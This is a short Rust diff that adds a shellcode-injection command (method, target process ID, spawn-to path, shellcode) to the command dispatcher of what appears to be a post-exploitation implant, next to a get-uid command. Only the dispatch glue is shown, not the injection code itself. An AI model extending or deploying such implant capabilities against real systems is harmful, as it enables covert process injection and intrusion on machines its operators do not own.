@@ -399,6 +399,9 @@ fn execute(
             Err(m) => vec![Response::Err(m.into())],
         },
         Command::GetUid => vec![Response::Output(crate::postex::getuid().into_bytes())],
+        Command::Inject { method, pid, spawn_to, shellcode } => {
+            vec![crate::inject::do_inject(method, pid, spawn_to.as_str(), shellcode.as_slice())]
+        }
     }
 }
 
